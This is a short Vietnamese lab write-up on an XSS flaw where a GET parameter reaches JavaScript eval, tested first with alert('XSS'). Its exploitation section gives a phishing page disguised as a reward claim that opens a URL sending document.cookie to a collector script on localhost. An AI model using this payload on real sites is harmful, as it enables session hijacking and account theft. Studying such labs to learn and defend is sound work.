Không giống các bài trước, bài này không có box để nhập

![image](https://github.com/user-attachments/assets/f29bf040-edd1-4f39-8523-d8f53e0bf18a)

Source:

![image](https://github.com/user-attachments/assets/6e18371d-c62e-4256-a022-6e4dc6a6e3e4)

Bài này dùng hàm eval làm mã lệnh trong Js. Ở đây hàm eval lấy giá trị Date() để hiển thị thời gian bên client.

Để ý url có thể thấy bài này dùng method Get

![image](https://github.com/user-attachments/assets/ceec2513-900c-4a0b-85de-74f239f01006)

### Kiểm tra XSS

Thử thay giá trị ```Date()``` thành một mã lệnh khác như ```alert('XSS')``` và thấy kết quả như hình dưới.

![image](https://github.com/user-attachments/assets/6be7a037-7fd3-4f6c-b624-89bf44d2c305)

--> XSS đây rồi

### Khai thác

Tạo một url phishing cookie 
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nhận phần thưởng</title>
</head>
<body>
    <h1>Đang xử lý...</h1>
    <script>
    window.open("http://localhost/get.php?cookie=" + document.cookie);
    </script>
</body>
</html>
```
